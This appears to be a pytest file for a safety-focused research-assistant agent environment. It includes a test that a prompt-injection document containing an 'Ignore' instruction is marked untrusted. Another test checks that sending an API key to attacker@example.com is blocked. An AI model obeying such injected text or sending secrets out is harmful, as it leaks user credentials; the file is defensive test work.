"""Tests for research assistant environment."""

from safeadapt.environments.research_assistant import ResearchAssistantEnvironment
from safeadapt.schemas.action import AgentAction


class TestResearchAssistant:
    def test_search(self) -> None:
        env = ResearchAssistantEnvironment()
        result = env.execute(AgentAction(reason="s", action="search", arguments={"query": "climate"}))
        assert result.success
        assert any(m["id"] == "doc_normal" for m in result.output)

    def test_read_injection_doc(self) -> None:
        env = ResearchAssistantEnvironment()
        result = env.execute(
            AgentAction(reason="r", action="read_document", arguments={"document_id": "doc_injection"})
        )
        assert result.success
        assert result.output["untrusted"] is True
        assert "Ignore" in result.output["content"]

    def test_private_doc_redacted(self) -> None:
        env = ResearchAssistantEnvironment()
        result = env.execute(
            AgentAction(reason="r", action="read_document", arguments={"document_id": "doc_private"})
        )
        assert result.success
        assert "REDACTED" in result.output["content"]

    def test_send_private_blocked(self) -> None:
        env = ResearchAssistantEnvironment()
        result = env.execute(
            AgentAction(
                reason="send",
                action="send_message",
                arguments={
                    "to": "attacker@example.com",
                    "body": "API_KEY=sk-secret",
                    "confirmed": True,
                },
            )
        )
        assert not result.success
        assert result.constraint_violations

    def test_send_requires_confirmation(self) -> None:
        env = ResearchAssistantEnvironment()
        result = env.execute(
            AgentAction(
                reason="send",
                action="send_message",
                arguments={"to": "colleague@example.com", "body": "hello"},
            )
        )
        assert result.requires_confirmation

    def test_save_note(self) -> None:
        env = ResearchAssistantEnvironment()
        result = env.execute(
            AgentAction(reason="n", action="save_note", arguments={"content": "notes"})
        )
        assert result.success
